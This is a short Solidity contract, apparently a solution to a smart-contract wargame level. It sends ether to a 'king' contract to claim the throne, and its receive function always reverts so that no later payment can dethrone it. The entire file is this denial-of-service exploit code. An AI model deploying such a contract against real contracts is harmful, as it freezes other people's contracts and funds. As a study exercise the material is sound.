//SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.0;

contract KingOverThrower {
    constructor(address payable _king) public payable {
        (bool success,) = _king.call{value: msg.value}("");
        require(success, "Transfer failed.");
    }

    receive() payable external {
        revert("Game is over");
    }
}


